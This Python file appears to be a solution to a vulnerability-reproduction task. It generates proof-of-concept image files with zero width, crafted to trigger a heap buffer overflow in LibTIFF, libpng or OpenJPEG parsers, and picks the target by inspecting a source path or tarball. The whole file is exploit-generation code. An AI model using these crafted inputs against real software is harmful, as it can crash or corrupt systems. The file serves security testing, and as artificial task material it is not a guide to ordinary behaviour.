import struct
import tarfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Strategy:
        The vulnerability is described as "zero width or height images are not checked".
        This commonly affects image parsing libraries like LibTIFF, OpenJPEG, or LibPNG.
        The code identifies the target library from the source path and generates
        a malformed image with 0 width/height.
        """
        target = "tiff" # Default to TIFF as it's a frequent suspect for this description
        
        # Heuristics to identify target
        try:
            lower_path = src_path.lower()
            if "png" in lower_path:
                target = "png"
            elif "openjpeg" in lower_path or "jp2" in lower_path:
                target = "jp2"
            elif "tiff" in lower_path:
                target = "tiff"
            else:
                # Inspect tarball contents for clues
                with tarfile.open(src_path, "r:*") as tar:
                    for name in tar.getnames():
                        n = name.lower()
                        if "libtiff" in n:
                            target = "tiff"
                            break
                        if "openjpeg" in n:
                            target = "jp2"
                            break
                        if "png" in n:
                            target = "png"
                            break
        except Exception:
            pass
            
        if target == "png":
            return self._gen_png()
        elif target == "jp2":
            return self._gen_jp2()
        else:
            return self._gen_tiff()

    def _gen_tiff(self) -> bytes:
        # Generates a TIFF with ImageWidth=0 to trigger Heap Buffer Overflow
        # Structure: Header + IFD + Payload
        
        # Header: II (little endian), 42, offset 8
        header = struct.pack('<2sH I', b'II', 42, 8)
        
        # Payload: PackBits compressed data (1 literal byte)
        # PackBits: \x00 (literal count=1) \xFF (data)
        # This causes the decoder to write 1 byte to the buffer.
        # If buffer size was calculated as Width(0) * ... = 0, this overflows.
        payload = b'\x00\xff'
        
        # IFD Entries (12 bytes each)
        # 256 ImageWidth = 0
        # 257 ImageLength = 1
        # 258 BitsPerSample = 8
        # 259 Compression = 32773 (PackBits)
        # 262 PhotometricInterpretation = 1 (BlackIsZero)
        # 273 StripOffsets = [calculated]
        # 277 SamplesPerPixel = 1
        # 278 RowsPerStrip = 1
        # 279 StripByteCounts = len(payload)
        
        tags = [
            (256, 4, 1, 0),
            (257, 4, 1, 1),
            (258, 3, 1, 8),
            (259, 3, 1, 32773),
            (262, 3, 1, 1),
            (273, 4, 1, 0), # placeholder
            (277, 3, 1, 1),
            (278, 4, 1, 1),
            (279, 4, 1, len(payload))
        ]
        
        # Calculate offsets
        num_tags = len(tags)
        ifd_size = 2 + (num_tags * 12) + 4
        payload_offset = 8 + ifd_size
        
        # Fix StripOffsets
        final_tags = []
        for tag, typ, cnt, val in tags:
            if tag == 273:
                val = payload_offset
            final_tags.append((tag, typ, cnt, val))
            
        # Serialize IFD
        ifd = bytearray()
        ifd.extend(struct.pack('<H', num_tags))
        for tag in final_tags:
            ifd.extend(struct.pack('<HHII', *tag))
        ifd.extend(struct.pack('<I', 0)) # Next IFD offset (0)
        
        return header + ifd + payload

    def _gen_png(self) -> bytes:
        # Generates a PNG with 0 width
        sig = b'\x89PNG\r\n\x1a\n'
        
        def chunk(name, data):
            import zlib
            crc = zlib.crc32(name + data) & 0xffffffff
            return struct.pack('>I', len(data)) + name + data + struct.pack('>I', crc)
        
        # IHDR: Width=0, Height=1, Depth=8, Color=2, Comp=0, Filter=0, Interlace=0
        ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 0, 1, 8, 2, 0, 0, 0))
        iend = chunk(b'IEND', b'')
        return sig + ihdr + iend

    def _gen_jp2(self) -> bytes:
        # Generates a JPEG 2000 Codestream with 0 width
        # SOC
        out = b'\xff\x4f'
        # SIZ marker (0 width)
        # Lsiz, Rsiz, Xsiz=0, Ysiz=1, XOsiz=0, YOsiz=0, XTsiz=128, YTsiz=128, XTOsiz=0, YTOsiz=0, Csiz=1
        params = struct.pack('>HIIIIIIIIH', 
            0, # Rsiz
            0, 1, # Xsiz, Ysiz (Width=0)
            0, 0, # Image offsets
            128, 128, # Tile size
            0, 0, # Tile offset
            1 # Components
        )
        params += b'\x07\x01\x01' # 8 bit, 1x1 subsampling
        
        out += b'\xff\x51' + struct.pack('>H', len(params) + 2) + params
        out += b'\xff\xd9' # EOC
        return out
